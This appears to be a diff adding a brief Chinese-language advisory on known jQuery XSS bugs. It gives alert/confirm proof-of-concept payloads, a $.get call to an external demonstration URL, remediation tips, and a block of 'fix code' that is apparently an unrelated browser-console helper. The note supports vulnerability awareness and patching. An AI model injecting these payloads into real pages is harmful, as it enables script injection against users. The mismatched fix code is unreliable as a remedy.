@@ -1,0 +1,33 @@
+Bug 11290：
+$("element[attribute='<img src=x onerror=alert(666)>'")
+
+Bug 9521：
+$("<img src=1 onerror=confirm('xss');>")
+$("<img src=x onerror=alert('xss');>")
+
+issue 2432:
+$.get('http://sakurity.com/jqueryxss')
+
+修复建议
+1、升级jquery版本至最新。
+2、使用全局过滤，过滤特殊字符。
+3、参考https://github.com/MrWQ/jquery_xss_repair/upload/master
+4、参考修复代码
+/**
+ * Find a node by ID.
+ *
+ * @param string id
+ *        The ID of the element you want.
+ * @return Node or null
+ *         The result of calling document.querySelector(selector).
+ */
+WebConsoleCommands._registerOriginal("$", function(owner, selector) {
+  try {
+    return owner.window.document.querySelector(selector);
+  } catch (err) {
+    // Throw an error like `err` but that belongs to `owner.window`.
+    throw new owner.window.DOMException(err.message, err.name);
+  }
+});
+
+
